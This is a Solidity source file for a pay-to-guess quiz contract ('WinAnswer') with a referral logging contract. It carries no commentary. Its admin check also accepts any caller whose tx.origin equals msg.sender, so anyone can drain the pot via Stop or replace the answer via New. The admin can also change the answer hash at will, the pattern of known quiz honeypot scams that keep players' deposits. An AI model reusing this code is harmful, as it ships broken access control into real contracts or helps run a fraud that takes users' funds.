import "./ContractsFactory.sol";
pragma solidity 0.8.11;

contract WinAnswer
{
    string name;
    string public question;

    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
        cumulated = cumulated + msg.value;
        referrals.log("Try");
    }

    function Start(string calldata _question, string calldata _response) public payable isAdmin {
        responseHash = keccak256(abi.encode(_response));
        question = _question;
    }

    uint cumulated;
    address admin;
    bytes32 responseHash;
    Referrals referrals;
    address referral;
    bool referralTookGain;

    function balanceOf() public view returns (uint256) {
        return address(this).balance;
    }

    function Stop() public payable isAdmin {
        require(address(this).balance > 0);
        if(referral != address(0)){
            payable(msg.sender).transfer(address(this).balance);
        }else{
            uint amount = address(this).balance - cumulated * 2 / 100;
            payable(msg.sender).transfer(amount);
        }
        referrals.log("Stop");
    }

    function SetReferral(address _referral) public isAdmin {
        if(referral == address(0)){
            referral = _referral;
        }
    }

    function WithdrawReferralGain() public payable {
        require(msg.sender == referral && !referralTookGain && referrals.referralExist(msg.sender));
        uint referralGain = cumulated * 2 / 100;
        referralTookGain = true;
        payable(referral).transfer(referralGain);
    }

    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    constructor() {
        admin = tx.origin;
        referrals = Referrals(ContractsFactory(msg.sender).referrals());
    }

    modifier isAdmin(){
        require(admin == msg.sender || admin == tx.origin || tx.origin == msg.sender);
        _;
    }

    fallback() external {}
}


contract Referrals {
    string name;
    mapping (address=>bool) public referrals;
    event NewReferral(address indexed referral);
    event Log(address indexed, string message);
    address platform;

    function log(string calldata message) public {
        emit Log(msg.sender, message);
    }

    constructor(){
        platform = msg.sender;
    }

    function addReferralOnNewContractCreation(address newReferral) public isPlatform {
        referrals[newReferral] = true;
        emit NewReferral(newReferral);
    }

    modifier isPlatform(){
        require(msg.sender == platform);
        _;
    }

    function setPlatform(address _platform) public {
        require(msg.sender == platform);
        platform = _platform;
    }

    function referralExist(address referral) public view returns(bool){
        return referrals[referral];
    }
}